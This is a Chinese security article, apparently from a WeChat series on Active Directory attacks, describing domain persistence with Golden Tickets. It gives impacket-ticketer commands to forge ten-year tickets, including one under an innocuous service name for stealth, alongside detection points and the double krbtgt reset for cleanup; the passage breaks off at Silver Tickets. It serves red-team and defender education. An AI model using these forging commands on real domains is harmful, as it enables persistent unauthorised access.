---
title: 赶不走的幽灵：AD域持久化技术与检测对抗
url: https://mp.weixin.qq.com/s/KgSBwlNzCyRksjWnqngvlA
source: Doonsec's feed
date: 2026-04-17
fetch_date: 2026-04-18T04:31:05.387111
---

# 赶不走的幽灵：AD域持久化技术与检测对抗

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/L7VicJKsiaibFAcHTAPAYJwhutL7KdyRpib2aibRKhU5q1MRicSWZWZu9sibOzXHBGBDDZNtDNVBKonLhZg2hStuafe5yXYx7Piaj5qF5CPrOhtdzpM/0?wx_fmt=jpeg)

# 赶不走的幽灵：AD域持久化技术与检测对抗

原创

极客零零七
极客零零七

极客零零七

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

> 极客零零七 · AD攻击系列 · 第8篇

---

拿到域控不是终点。对红队来说，真正的挑战是**如何在蓝队的清理行动中存活下来**。对蓝队来说，确认域控被攻破后最痛苦的问题是：**我以为我清理干净了，但攻击者还在。**

本文从攻击者视角，系统梳理AD持久化技术——从经典的Golden Ticket到隐蔽的AdminSDHolder、Skeleton Key、SID History注入。每种技术都说清楚三件事：**怎么种、怎么查、怎么清。**

---

### 一、Golden Ticket：最经典的持久化

前文（第2篇）已详细讲解原理。这里聚焦持久化的实战细节。

#### 为什么Golden Ticket是持久化之王

| 特性 | 说明 |
| --- | --- |
| 不依赖任何账户密码 | 即使所有用户密码重置，Golden Ticket仍然有效 |
| 可设置任意有效期 | 通常设置10年 |
| 可伪造任意用户 | 包括不存在的用户 |
| 不在DC上留下会话 | 票据在客户端生成 |
| 唯一清除方式 | 重置krbtgt密码**两次** |

#### 攻击者的持久化操作

```
## 获取krbtgt哈希后，生成多张Golden Ticket保存到安全位置## 票据1：伪造Administrator，有效期10年impacket-ticketer -nthash <KRBTGT_HASH> -domain-sid S-1-5-21-xxx -domain domain.local -duration 3650 Administrator
## 票据2：伪造一个看似正常的用户名（更隐蔽）impacket-ticketer -nthash <KRBTGT_HASH> -domain-sid S-1-5-21-xxx -domain domain.local -duration 3650 svc_monitor
## 保存到安全位置，随时可用
```

#### 蓝队检测

```
检测点1：票据有效期异常  - 正常TGT有效期：10小时（默认策略）  - Golden Ticket有效期：通常远超10小时  - 监控4768/4769事件中的票据生命周期
检测点2：不存在的用户名  - 如果票据中的用户名在AD中不存在，说明是伪造的  - 但攻击者通常会使用真实存在的用户名来规避
检测点3：RID不匹配  - Golden Ticket中的用户名和RID可以不匹配  - 比如票据声称是"svc_monitor"但RID是500（Administrator）
```

#### 清除方式

krbtgt密码必须重置两次——因为AD保留密码历史中前一个密码，仍可用于验证旧票据。

```
## 第一次重置Reset-KrbtgtKeyInteractive  # 微软官方脚本
## 等待至少12小时（确保复制完成、旧票据过期）
## 第二次重置Reset-KrbtgtKeyInteractive
## 警告：这会导致所有现有Kerberos票据失效## 所有用户需要重新认证，所有服务需要获取新票据## 必须在维护窗口执行
```

---

### 二、Silver Ticket持久化：无声的寄生

#### 持久化优势

Silver Ticket不经过KDC验证，**域控上不会产生任何日志**。攻击者只需要目标服务账户/机器账户的哈希。

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/vRBYx9F4Zf6FIrWa8y7Avoujo7CWGRp0ICqvZGJIdtQgzNlzefeHiaeibmBZbcl5Oyj9wBNTsPiczEeKCelS9xjibw/0?wx_fmt=png)

极客零零七

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/vRBYx9F4Zf6FIrWa8y7Avoujo7CWGRp0ICqvZGJIdtQgzNlzefeHiaeibmBZbcl5Oyj9wBNTsPiczEeKCelS9xjibw/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过